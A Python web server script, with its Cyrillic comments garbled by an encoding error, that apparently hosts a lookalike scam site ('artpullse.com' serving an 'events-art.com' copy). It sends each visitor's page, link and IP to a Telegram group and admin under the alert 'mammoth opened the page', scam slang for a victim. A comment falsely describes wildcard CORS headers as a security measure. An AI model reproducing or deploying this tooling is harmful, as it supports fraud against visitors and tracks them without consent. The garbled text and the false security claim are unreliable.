#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests
from config import BOT_TOKEN, GROUP_ID, ADMIN_ID

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞ –¥–ª—è artpullse.com
PORT = 8080  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ—Ä—Ç 8080
DIRECTORY = "events-art.com"  # –ü–∞–ø–∫–∞ —Å —Å–∞–π—Ç–æ–º
DOMAIN = "artpullse.com"  # –í–∞—à –¥–æ–º–µ–Ω

def send_telegram_log(page, link, ip, country=""):
    msg = (
        f"‚ö†Ô∏è –ú–∞–º–æ–Ω—Ç –æ—Ç–∫—Ä—ã–ª —Å—Ç—Ä–∞–Ω–∏—Ü—É\n"
        f"üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞: {page}\n"
        f"üîó –°—Å—ã–ª–∫–∞: {link}\n"
        f"üåç IP: {ip}\n"
        f"üåè –°—Ç—Ä–∞–Ω–∞: {country}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
    except Exception as e:
        print(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ª–æ–≥ —É Telegram: {e}")

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # –î–æ–±–∞–≤–ª—è–µ–º CORS –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ –¥–ª—è –¥–æ–º–µ–Ω–∞
        self.send_header('Server', f'Events Art Server - {DOMAIN}')
        super().end_headers()
    
    def do_GET(self):
        path = unquote(self.path.split('?', 1)[0])
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # –Ø–∫—â–æ —Ü–µ —Ä–µ—Å—É—Ä—Å ‚Äî –Ω–µ –ª–æ–≥—É–≤–∞—Ç–∏
        if any(ext in path for ext in skip_ext) or any(d in path for d in skip_dirs):
            return super().do_GET()
        # –ù–æ—Ä–º–∞–ª—ñ–∑—É—î–º–æ —à–ª—è—Ö –¥–ª—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ—Å—Ç—ñ
        norm_path = path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # –õ–æ–≥—É–≤–∞—Ç–∏ —Ç—ñ–ª—å–∫–∏ —è–∫—â–æ —Ü–µ –æ—Å–Ω–æ–≤–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"üìù –õ–æ–≥—É—î–º–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=self.client_address[0]
                )
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")
    
    def log_message(self, format, *args):
        # –ö–∞—Å—Ç–æ–º–Ω–µ –ª–æ–≥—É–≤–∞–Ω–Ω—è
        print(f"üìù {format % args}")

    def do_POST(self):
        path = unquote(self.path.split('?', 1)[0])
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            import json
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = self.client_address[0]
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def main():
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ –ø–∞–ø–∫–∏ —Å —Å–∞–π—Ç–æ–º
    if not os.path.exists(DIRECTORY):
        print(f"‚ùå –û—à–∏–±–∫–∞: –ü–∞–ø–∫–∞ '{DIRECTORY}' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!")
        print(f"üìÅ –ü–æ—Ç–æ—á–Ω–∏–π —à–ª—è—Ö: {os.getcwd()}")
        print(f"üìÅ –®—É–∫–∞—î–º–æ: {os.path.abspath(DIRECTORY)}")
        sys.exit(1)
    
    print(f"‚úÖ –ü–∞–ø–∫–∞ '{DIRECTORY}' –∑–Ω–∞–π–¥–µ–Ω–∞")
    print(f"üìÅ –ü–æ–≤–Ω–∏–π —à–ª—è—Ö: {os.path.abspath(DIRECTORY)}")
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ —î index.html
    index_path = os.path.join(DIRECTORY, 'index.html')
    if not os.path.exists(index_path):
        print(f"‚ùå –ü–æ–º–∏–ª–∫–∞: index.html –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –≤ –ø–∞–ø—Ü—ñ '{DIRECTORY}'!")
        sys.exit(1)
    
    print(f"‚úÖ index.html –∑–Ω–∞–π–¥–µ–Ω–æ: {index_path}")
    
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –¥–ª—è –¥–æ–º–µ–Ω–∞: {DOMAIN}")
            print(f"üìÅ –ö–æ—Ä–Ω–µ–≤–∞—è –ø–∞–ø–∫–∞: {os.path.abspath(DIRECTORY)}")
            print(f"üåê –õ–æ–∫–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø: http://localhost:{PORT}")
            print(f"üåç –í–Ω–µ—à–Ω–∏–π –¥–æ—Å—Ç—É–ø: http://{DOMAIN}:{PORT}")
            print(f"üîó IP —Å–µ—Ä–≤–µ—Ä–∞: 144.172.112.39")
            print(f"üìù DNS –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:")
            print(f"   A –∑–∞–ø–∏—Å—å: @ ‚Üí 144.172.112.39")
            print(f"   CNAME –∑–∞–ø–∏—Å—å: www ‚Üí {DOMAIN}")
            print("‚èπÔ∏è  –î–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ Ctrl+C")
            print("-" * 60)
            
            httpd.serve_forever()
            
    except PermissionError:
        print(f"‚ùå –û—à–∏–±–∫–∞: –ù–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–∞ {PORT}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è  –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 